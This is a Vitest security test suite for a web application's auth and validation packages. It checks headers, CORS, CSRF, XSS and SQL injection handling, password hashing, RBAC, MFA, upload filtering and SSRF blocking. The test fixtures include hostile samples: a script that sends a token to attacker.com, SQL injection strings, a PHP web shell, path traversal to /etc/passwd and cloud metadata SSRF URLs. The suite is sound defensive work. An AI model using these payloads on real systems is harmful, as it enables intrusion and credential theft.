import { describe, it, expect } from "vitest";
import {
  buildContentSecurityPolicy,
  getProductionSecurityHeaders,
  isOriginAllowed,
  getCorsHeaders,
  generateCsrfToken,
  verifyCsrfToken,
  verifyOriginOrReferer,
  escapeHtml,
  sanitizeUrl,
  sanitizeMarkdownHtml,
  detectMagicMimeType,
  sanitizeFilename,
  validateFileUploadSecurity,
  isPrivateIp,
  isSafeOutboundUrl,
  validateSecretsEntropy,
  maskSensitiveEmail,
  maskSensitivePhone,
  sanitizeErrorResponse,
  hashPassword,
  verifyPassword,
  generateMfaSecret,
  generateTotpToken,
  verifyTotpToken,
  generateMfaBackupCodes,
  verifyBackupCode,
  hasPermission,
  getPermissionsForRole,
  ROLE_PERMISSIONS,
  AuthRole,
  AdminPermission,
} from "@samvad/auth";
import { contactSubmissionSchema } from "@samvad/validation";

describe("SAMVAD Advisory - Production Security Architecture & Threat Model Verification", () => {
  // ---------------------------------------------------------------------------
  // 1. HTTPS ASSUMPTIONS & PRODUCTION SECURITY HEADERS
  // ---------------------------------------------------------------------------
  describe("1. Production Security Headers & Defense-in-Depth", () => {
    it("should generate strict Content-Security-Policy (CSP) directives blocking unsafe scripts and object execution", () => {
      const csp = buildContentSecurityPolicy({ isDev: false });

      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("frame-ancestors 'none'");
      expect(csp).toContain("base-uri 'self'");
      expect(csp).toContain("form-action 'self'");
      expect(csp).toContain("upgrade-insecure-requests");
      expect(csp).toContain("block-all-mixed-content");
      // Must not allow unsafe-inline in script-src for production
      expect(csp).not.toContain("script-src 'self' 'unsafe-eval' 'unsafe-inline'");
    });

    it("should enforce mandatory HTTP Strict Transport Security (HSTS) with subdomains and preload", () => {
      const headers = getProductionSecurityHeaders({ isDev: false });
      const hsts = headers["Strict-Transport-Security"];

      expect(hsts).toBeDefined();
      expect(hsts).toContain("max-age=63072000"); // 2 years
      expect(hsts).toContain("includeSubDomains");
      expect(hsts).toContain("preload");
    });

    it("should provide X-Content-Type-Options: nosniff to prevent MIME sniffing attacks", () => {
      const headers = getProductionSecurityHeaders();
      expect(headers["X-Content-Type-Options"]).toBe("nosniff");
    });

    it("should configure X-Frame-Options: DENY to prevent clickjacking and framing attacks", () => {
      const headers = getProductionSecurityHeaders();
      expect(headers["X-Frame-Options"]).toBe("DENY");
    });

    it("should enforce strict Referrer-Policy and restrictive Permissions-Policy", () => {
      const headers = getProductionSecurityHeaders();
      expect(headers["Referrer-Policy"]).toBe("strict-origin-when-cross-origin");
      expect(headers["Permissions-Policy"]).toContain("camera=()");
      expect(headers["Permissions-Policy"]).toContain("microphone=()");
      expect(headers["Permissions-Policy"]).toContain("geolocation=()");
      expect(headers["Cross-Origin-Opener-Policy"]).toBe("same-origin");
      expect(headers["Cross-Origin-Resource-Policy"]).toBe("same-origin");
    });
  });

  // ---------------------------------------------------------------------------
  // 2. CORS POLICY & PREFLIGHT HANDLING
  // ---------------------------------------------------------------------------
  describe("2. Cross-Origin Resource Sharing (CORS) Policy", () => {
    it("should permit legitimate application domains and subdomains", () => {
      expect(isOriginAllowed("https://samvadadvisory.com")).toBe(true);
      expect(isOriginAllowed("https://admin.samvadadvisory.com")).toBe(true);
      expect(isOriginAllowed("https://preview.samvadadvisory.com")).toBe(true);
    });

    it("should reject malicious origins, lookalike domains, and null origin", () => {
      expect(isOriginAllowed("https://evil-samvadadvisory.com")).toBe(false);
      expect(isOriginAllowed("https://samvadadvisory.com.attacker.com")).toBe(false);
      expect(isOriginAllowed("http://insecure-samvadadvisory.com")).toBe(false);
      expect(isOriginAllowed("null")).toBe(false);
      expect(isOriginAllowed(null)).toBe(false);
      expect(isOriginAllowed(undefined)).toBe(false);
    });

    it("should produce credentialed CORS headers without wildcard leakage", () => {
      const validOrigin = "https://samvadadvisory.com";
      const headers = getCorsHeaders(validOrigin);

      expect(headers["Access-Control-Allow-Origin"]).toBe(validOrigin);
      expect(headers["Access-Control-Allow-Credentials"]).toBe("true");
      expect(headers["Access-Control-Allow-Methods"]).toContain("GET, POST, PUT, PATCH, DELETE");
      expect(headers["Access-Control-Allow-Origin"]).not.toBe("*"); // Never allow * with credentials
    });
  });

  // ---------------------------------------------------------------------------
  // 3. CROSS-SITE REQUEST FORGERY (CSRF) DEFENSE
  // ---------------------------------------------------------------------------
  describe("3. Anti-CSRF Token Generation & Origin Verification", () => {
    const testSecret = "enterprise_csrf_secret_key_minimum_32_characters_long";
    const testSessionId = "sess_advisory_lead_token_9918";

    it("should generate a cryptographically bound HMAC CSRF token", () => {
      const token = generateCsrfToken(testSecret, testSessionId);
      expect(token).toBeDefined();
      expect(token.split(".").length).toBe(2); // payload.signature
    });

    it("should verify valid CSRF tokens in constant time", () => {
      const token = generateCsrfToken(testSecret, testSessionId);
      const isValid = verifyCsrfToken(token, testSecret, testSessionId);
      expect(isValid).toBe(true);
    });

    it("should reject CSRF tokens with altered payload, wrong session ID, or wrong secret", () => {
      const token = generateCsrfToken(testSecret, testSessionId);

      expect(verifyCsrfToken(token, testSecret, "different_session_id")).toBe(false);
      expect(verifyCsrfToken(token, "tampered_secret_key_32_chars_long", testSessionId)).toBe(false);

      const parts = token.split(".");
      const forgedToken = `${parts[0]}.badsignature`;
      expect(verifyCsrfToken(forgedToken, testSecret, testSessionId)).toBe(false);
    });

    it("should reject expired CSRF tokens (TTL enforcement)", () => {
      const token = generateCsrfToken(testSecret, testSessionId);
      // Verify with maxAgeSeconds = -1 (already expired)
      const isValid = verifyCsrfToken(token, testSecret, testSessionId, -1);
      expect(isValid).toBe(false);
    });

    it("should verify request origin/referer against host header to defeat cross-site POSTs", () => {
      const sameOriginReq = {
        headers: {
          get: (name: string) => {
            if (name === "host") return "samvadadvisory.com";
            if (name === "origin") return "https://samvadadvisory.com";
            return null;
          },
        },
      };
      expect(verifyOriginOrReferer(sameOriginReq)).toBe(true);

      const crossOriginAttackerReq = {
        headers: {
          get: (name: string) => {
            if (name === "host") return "samvadadvisory.com";
            if (name === "origin") return "https://attacker-domain.org";
            return null;
          },
        },
      };
      expect(verifyOriginOrReferer(crossOriginAttackerReq)).toBe(false);
    });
  });

  // ---------------------------------------------------------------------------
  // 4. CROSS-SITE SCRIPTING (XSS) & OUTPUT ENCODING
  // ---------------------------------------------------------------------------
  describe("4. XSS Prevention & Output Sanitization", () => {
    it("should encode HTML special characters to prevent stored/reflected XSS", () => {
      const payload = `<script>alert('XSS')</script>" & 'bold'`;
      const encoded = escapeHtml(payload);

      expect(encoded).not.toContain("<script>");
      expect(encoded).toContain("&lt;script&gt;");
      expect(encoded).toContain("&quot;");
      expect(encoded).toContain("&#039;");
      expect(encoded).toContain("&amp;");
    });

    it("should neutralize dangerous URL schemes (javascript:, vbscript:, data:)", () => {
      expect(sanitizeUrl("javascript:alert(document.cookie)")).toBeNull();
      expect(sanitizeUrl("javascript:window.location='http://attacker.com'")).toBeNull();
      expect(sanitizeUrl("vbscript:MsgBox(1)")).toBeNull();
      expect(sanitizeUrl("data:text/html,<script>alert(1)</script>")).toBeNull();
      expect(sanitizeUrl("https://samvadadvisory.com/monographs")).toBe("https://samvadadvisory.com/monographs");
      expect(sanitizeUrl("/contact")).toBe("/contact");
    });

    it("should strip executable script tags and inline event handlers from markdown HTML", () => {
      const dirtyHtml = `
        <p>Strategic Advisory Monograph</p>
        <script>fetch('http://attacker.com?steal=' + localStorage.getItem('token'))</script>
        <img src="x" onerror="alert(1)" />
        <a href="javascript:void(0)" onclick="malicious()">Click Here</a>
      `;
      const cleanHtml = sanitizeMarkdownHtml(dirtyHtml);

      expect(cleanHtml).not.toContain("<script>");
      expect(cleanHtml).not.toContain("onerror=");
      expect(cleanHtml).not.toContain("onclick=");
      expect(cleanHtml).not.toContain("javascript:");
      expect(cleanHtml).toContain("Strategic Advisory Monograph");
    });
  });

  // ---------------------------------------------------------------------------
  // 5. SQL INJECTION & PARAMETERIZED DATA PROTECTIONS
  // ---------------------------------------------------------------------------
  describe("5. SQL Injection & Parameterized Query Protections", () => {
    it("should properly sanitize and reject classic SQL injection payloads in user inputs", () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE \"AdminUser\"; --",
        "1 UNION SELECT null, email, passwordHash FROM \"AdminUser\"--",
        "admin'--",
        "\" or \"\"=\"",
      ];

      for (const payload of sqlInjectionPayloads) {
        // Escaped HTML prevents execution in dynamic views
        const escaped = escapeHtml(payload);
        expect(escaped).not.toBe(payload);

        // Validation schemas strictly reject malicious email inputs
        const invalidEmail = contactSubmissionSchema.safeParse({
          name: "Test User",
          company: "Valid Corp",
          designation: "Director",
          email: payload,
          message: "Valid executive briefing message with sufficient length.",
        });
        expect(invalidEmail.success).toBe(false);
      }
    });
  });

  // ---------------------------------------------------------------------------
  // 6. AUTHENTICATION SECURITY & BRUTE FORCE DEFENSE
  // ---------------------------------------------------------------------------
  describe("6. Authentication Security & PBKDF2 Password Hashing", () => {
    const password = "BoardroomMasterPassphrase2026!#$";

    it("should hash passwords using PBKDF2 SHA-512 with 100,000 iterations and unique random salts", () => {
      const hash1 = hashPassword(password);
      const hash2 = hashPassword(password);

      expect(hash1).not.toBe(password); // Never plaintext
      expect(hash1).not.toBe(hash2); // Unique salts guarantee different hashes

      const parts = hash1.split(":");
      expect(parts.length).toBe(2);
      expect(parts[0]?.length).toBe(32); // 16 bytes salt = 32 hex chars
      expect(parts[1]?.length).toBe(128); // 64 bytes SHA-512 = 128 hex chars
    });

    it("should verify correct passwords and reject incorrect passwords in constant time", () => {
      const hash = hashPassword(password);

      expect(verifyPassword(password, hash)).toBe(true);
      expect(verifyPassword("WrongPassword123!", hash)).toBe(false);
      expect(verifyPassword("", hash)).toBe(false);
    });

    it("should prevent timing attacks by rejecting malformed hashes safely", () => {
      expect(verifyPassword(password, "malformed:hash:format")).toBe(false);
      expect(verifyPassword(password, "")).toBe(false);
    });
  });

  // ---------------------------------------------------------------------------
  // 7. ROLE-BASED ACCESS CONTROL (RBAC) & IDOR PROTECTION
  // ---------------------------------------------------------------------------
  describe("7. Role-Based Access Control (RBAC) Matrix & IDOR Boundaries", () => {
    const allRoles: AuthRole[] = [
      "SUPER_ADMIN",
      "CONTENT_ADMIN",
      "EDITOR",
      "AUTHOR",
      "ANALYST",
    ];

    it("should grant SUPER_ADMIN full operational permissions", () => {
      const perms = getPermissionsForRole("SUPER_ADMIN");
      expect(hasPermission("SUPER_ADMIN", "users:manage")).toBe(true);
      expect(hasPermission("SUPER_ADMIN", "audit:read")).toBe(true);
      expect(hasPermission("SUPER_ADMIN", "content:publish")).toBe(true);
      expect(hasPermission("SUPER_ADMIN", "leads:export")).toBe(true);
    });

    it("should restrict ANALYST role to strictly read-only intelligence views", () => {
      const perms = getPermissionsForRole("ANALYST");
      expect(perms).toContain("leads:read");
      expect(perms).toContain("leads:export");
      expect(perms).toContain("audit:read");

      // Mutations must be strictly forbidden
      expect(hasPermission("ANALYST", "content:create")).toBe(false);
      expect(hasPermission("ANALYST", "content:publish")).toBe(false);
      expect(hasPermission("ANALYST", "content:delete")).toBe(false);
      expect(hasPermission("ANALYST", "users:manage")).toBe(false);
      expect(hasPermission("ANALYST", "system:config")).toBe(false);
    });

    it("should restrict AUTHOR role from publishing without editorial review", () => {
      expect(hasPermission("AUTHOR", "content:create")).toBe(true);
      expect(hasPermission("AUTHOR", "content:edit")).toBe(true);
      expect(hasPermission("AUTHOR", "content:publish")).toBe(false);
      expect(hasPermission("AUTHOR", "content:delete")).toBe(false);
    });

    it("should permit EDITOR to publish content but not manage administrator accounts", () => {
      expect(hasPermission("EDITOR", "content:publish")).toBe(true);
      expect(hasPermission("EDITOR", "users:manage")).toBe(false);
      expect(hasPermission("EDITOR", "system:manage")).toBe(false);
    });
  });

  // ---------------------------------------------------------------------------
  // 8. MULTI-FACTOR AUTHENTICATION (MFA) ARCHITECTURE
  // ---------------------------------------------------------------------------
  describe("8. Admin MFA Architecture (TOTP & Emergency Backup Codes)", () => {
    it("should generate standard base32 TOTP secret and valid 6-digit tokens", () => {
      const secret = generateMfaSecret();
      expect(secret.length).toBe(32);

      const token = generateTotpToken(secret);
      expect(token).toMatch(/^\d{6}$/);

      const isValid = verifyTotpToken(token, secret);
      expect(isValid).toBe(true);
    });

    it("should reject invalid or manipulated TOTP tokens", () => {
      const secret = generateMfaSecret();
      expect(verifyTotpToken("000000", secret)).toBe(false);
      expect(verifyTotpToken("abc", secret)).toBe(false);
      expect(verifyTotpToken("", secret)).toBe(false);
    });

    it("should generate and verify one-time emergency backup codes, consuming upon use", () => {
      const { plaintextCodes, hashedCodes } = generateMfaBackupCodes(8);

      expect(plaintextCodes.length).toBe(8);
      expect(hashedCodes.length).toBe(8);

      const codeToTest = plaintextCodes[0]!;
      const result = verifyBackupCode(codeToTest, hashedCodes);

      expect(result.valid).toBe(true);
      // Must consume the code so it cannot be replayed
      expect(result.remainingHashedCodes.length).toBe(7);

      // Replaying the same consumed code must fail
      const replayResult = verifyBackupCode(codeToTest, result.remainingHashedCodes);
      expect(replayResult.valid).toBe(false);
    });
  });

  // ---------------------------------------------------------------------------
  // 9. FILE UPLOAD SECURITY & BINARY MAGIC-BYTE SNIFFING
  // ---------------------------------------------------------------------------
  describe("9. File Upload Security & Binary Magic-Byte Inspection", () => {
    it("should identify genuine JPEG, PNG, WEBP, and PDF files by binary signatures", () => {
      // JPEG: FF D8 FF
      const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      expect(detectMagicMimeType(jpegBuffer).mime).toBe("image/jpeg");

      // PNG: 89 50 4E 47 0D 0A 1A 0A
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      expect(detectMagicMimeType(pngBuffer).mime).toBe("image/png");

      // PDF: 25 50 44 46 (%PDF)
      const pdfBuffer = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x35]);
      expect(detectMagicMimeType(pdfBuffer).mime).toBe("application/pdf");
    });

    it("should detect and reject executable payloads disguised with image extensions (PE / ELF / Scripts)", () => {
      // Windows PE EXE disguised as image: starts with MZ (4D 5A)
      const fakeJpgExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      expect(detectMagicMimeType(fakeJpgExe).isExecutable).toBe(true);

      const validation = validateFileUploadSecurity({
        buffer: fakeJpgExe,
        declaredMimeType: "image/jpeg",
        filename: "avatar.jpg",
        maxSizeBytes: 5 * 1024 * 1024,
      });

      expect(validation.isValid).toBe(false);
      expect(validation.errorCode).toBe("MIME_MISMATCH");
    });

    it("should reject malicious PHP scripts disguised as images", () => {
      const phpPayload = Buffer.from("<?php system($_GET['cmd']); ?>");
      const validation = validateFileUploadSecurity({
        buffer: phpPayload,
        declaredMimeType: "image/jpeg",
        filename: "shell.php.jpg",
      });

      expect(validation.isValid).toBe(false);
      expect(validation.errorCode).toBe("UNSAFE_FILE_TYPE");
    });

    it("should sanitize filenames to prevent path traversal attacks (../../etc/passwd)", () => {
      expect(sanitizeFilename("../../../etc/passwd")).toBe("passwd");
      expect(sanitizeFilename("..\\..\\windows\\system32\\cmd.exe")).toBe("cmd.exe");
      expect(sanitizeFilename("press kit: confidential?.pdf")).toBe("press kit_ confidential_.pdf");
    });

    it("should enforce upload size limits strictly", () => {
      const hugeBuffer = Buffer.alloc(11 * 1024 * 1024); // 11MB
      const validation = validateFileUploadSecurity({
        buffer: hugeBuffer,
        declaredMimeType: "image/jpeg",
        filename: "large.jpg",
        maxSizeBytes: 10 * 1024 * 1024,
      });

      expect(validation.isValid).toBe(false);
      expect(validation.errorCode).toBe("FILE_TOO_LARGE");
    });
  });

  // ---------------------------------------------------------------------------
  // 10. SERVER-SIDE REQUEST FORGERY (SSRF) PROTECTION
  // ---------------------------------------------------------------------------
  describe("10. Server-Side Request Forgery (SSRF) Mitigations", () => {
    it("should detect and block RFC 1918 private subnets and loopback addresses", () => {
      expect(isPrivateIp("127.0.0.1")).toBe(true); // Loopback
      expect(isPrivateIp("localhost")).toBe(true);
      expect(isPrivateIp("10.0.0.1")).toBe(true); // Class A
      expect(isPrivateIp("172.16.5.20")).toBe(true); // Class B
      expect(isPrivateIp("192.168.1.100")).toBe(true); // Class C
      expect(isPrivateIp("169.254.169.254")).toBe(true); // Link-local cloud metadata
      expect(isPrivateIp("::1")).toBe(true); // IPv6 loopback
      expect(isPrivateIp("8.8.8.8")).toBe(false); // Public DNS
      expect(isPrivateIp("104.26.10.12")).toBe(false); // Public IP
    });

    it("should block outbound requests targeting AWS/GCP cloud instance metadata services", () => {
      expect(isSafeOutboundUrl("http://169.254.169.254/latest/meta-data/").isSafe).toBe(false);
      expect(isSafeOutboundUrl("http://metadata.google.internal/computeMetadata/v1/").isSafe).toBe(false);
      expect(isSafeOutboundUrl("http://127.0.0.1:5432/").isSafe).toBe(false);
      expect(isSafeOutboundUrl("file:///etc/passwd").isSafe).toBe(false);
      expect(isSafeOutboundUrl("gopher://127.0.0.1:6379").isSafe).toBe(false);
    });

    it("should permit legitimate public HTTPS webhook destinations", () => {
      expect(isSafeOutboundUrl("https://api.hubapi.com/crm/v3/objects/contacts").isSafe).toBe(true);
      expect(isSafeOutboundUrl("https://hooks.zapier.com/hooks/catch/123/abc").isSafe).toBe(true);
      expect(isSafeOutboundUrl("https://login.salesforce.com/services/oauth2/token").isSafe).toBe(true);
    });
  });

  // ---------------------------------------------------------------------------
  // 11. SECRETS MANAGEMENT & ENTROPY VERIFICATION
  // ---------------------------------------------------------------------------
  describe("11. Secrets Management & Entropy Requirements", () => {
    it("should enforce high-entropy secrets and reject weak, trivial, or placeholder secrets", () => {
      const weakSecrets = [
        "secret",
        "changeme",
        "admin123",
        "12345678901234567890123456789012", // Low entropy repeated characters
        "default_samvad_secret_key",
      ];

      for (const secret of weakSecrets) {
        expect(validateSecretsEntropy(secret).secure).toBe(false);
      }
    });

    it("should validate strong cryptographic secrets exceeding 32 characters with diverse character set", () => {
      const strongSecret = "e4a7f9b8c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7";
      expect(validateSecretsEntropy(strongSecret).secure).toBe(true);
    });
  });

  // ---------------------------------------------------------------------------
  // 12. DATA LEAKAGE PREVENTION & PII SANITIZATION
  // ---------------------------------------------------------------------------
  describe("12. Data Leakage Prevention & Output Sanitization", () => {
    it("should mask corporate emails in public/semi-public audit traces", () => {
      expect(maskSensitiveEmail("v.malhotra@bharatdynamics.co.in")).toBe("v.***@bharatdynamics.co.in");
      expect(maskSensitiveEmail("somnath@apexquantum.tech")).toBe("so***@apexquantum.tech");
    });

    it("should mask executive phone numbers", () => {
      expect(maskSensitivePhone("+91 98200 12345")).toBe("+91****2345");
      expect(maskSensitivePhone("+41 22 819 9200")).toBe("+41****9200");
    });

    it("should sanitize error responses to prevent internal stack traces or database schema leakage", () => {
      const dbError = new Error("Connection failed: relation \"AdminUser\" password postgresql://admin:secret@db:5432/prod");
      (dbError as any).code = "28P01";
      (dbError as any).stack = "Error: at PrismaClient.execute (/app/node_modules/prisma/client.js:104)";

      const sanitized = sanitizeErrorResponse(dbError, true); // production mode
      expect(sanitized.message).not.toContain("AdminUser");
      expect(sanitized.message).not.toContain("postgresql://");
      expect(sanitized.message).not.toContain("secret");
      expect(sanitized).not.toHaveProperty("stack");
      expect(sanitized.code).toBe("REQUEST_PROCESSING_ERROR");
    });
  });

  // ---------------------------------------------------------------------------
  // 13. BOT ABUSE & HONEYPOT DEFENSE
  // ---------------------------------------------------------------------------
  describe("13. Bot Abuse & Anti-Spam Protections", () => {
    it("should reject inquiries where the honeypot field is filled by automated scrapers", () => {
      const botPayload = {
        name: "Bot Inquirer",
        company: "Automated Corp",
        designation: "Bot",
        email: "bot@automation.com",
        serviceRequired: "PR",
        industry: "Technology",
        message: "Spam advertisement message with sufficient length for validation.",
        honeypot: "http://spam-link.org", // Honeypot trap
      };

      const result = contactSubmissionSchema.safeParse(botPayload);
      expect(result.success).toBe(false);
    });

    it("should reject submissions from known disposable email services", () => {
      const disposablePayload = {
        name: "Throwaway User",
        company: "Temp Corp",
        designation: "VP",
        email: "executive@mailinator.com",
        serviceRequired: "PR",
        industry: "Technology",
        message: "Legitimate-looking message with sufficient length.",
      };

      const result = contactSubmissionSchema.safeParse(disposablePayload);
      expect(result.success).toBe(false);
    });
  });
});
